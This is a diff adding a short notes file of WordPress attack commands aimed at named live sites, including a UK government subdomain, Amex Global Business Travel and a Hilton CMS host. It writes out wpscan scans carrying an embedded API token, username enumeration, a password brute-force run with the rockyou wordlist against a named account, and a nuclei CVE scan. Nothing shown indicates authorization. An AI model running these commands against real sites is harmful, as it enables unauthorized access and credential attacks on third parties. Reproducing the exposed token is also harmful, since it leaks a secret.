@@ -1,0 +1,22 @@
+ wpscan --url https://windrush-monument.levellingup.gov.uk --api-token jbq2ygguSeFswfIxM80aB3ph4GAayu7XRRUs9GMWvBg
+
+
+
+
+wpscan --url https://www.amexglobalbusinesstravel.com/ --api-token jbq2ygguSeFswfIxM80aB3ph4GAayu7XRRUs9GMWvBg
+
+
+to find user name 
+
+ wpscan -e u --url http://lxr-cms.hiltonbusinessonline.com
+
+
+burte force user name and password 
+wpscan --url http://lxr-cms.hiltonbusinessonline.com -U xd_user -P /root/wordlists/rockyou.txt
+
+ nuclei -t /root/nuclei-wordfence-cve -u https://www.iaggbs.com/
+
+wordpress bugs 
+
+https://core.trac.wordpress.org/search?q=6.4.3 
+
